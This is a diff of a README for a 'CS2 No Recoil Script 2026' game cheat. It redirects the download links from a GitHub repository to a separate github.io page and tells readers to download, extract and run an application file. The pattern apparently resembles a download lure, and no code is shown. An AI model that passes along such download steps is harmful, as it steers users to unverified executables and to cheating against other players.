@@ -1,6 +1,6 @@
 # 🎯 cs2-no-recoil-script-2026 - Shoot Straight, Win More Games
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_Script_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alliebehindhand7878/cs2-no-recoil-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_Script_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://alliebehindhand7878.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the CS2 No Recoil Script 2026
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Alliebehindhand7878/cs2-no-recoil-script-2026](https://github.com/Alliebehindhand7878/cs2-no-recoil-script-2026)
+Visit this link to download the application: [https://alliebehindhand7878.github.io](https://alliebehindhand7878.github.io)
 
 Click the big green "Code" button on that page, then select "Download ZIP". Once the download finishes, find the ZIP file in your "Downloads" folder. Right-click it and choose "Extract All". Pick a folder you'll remember, like your Desktop, and click "Extract". You'll now see a folder called "cs2-no-recoil-script-2026" — open it and you'll find the application file inside.
 
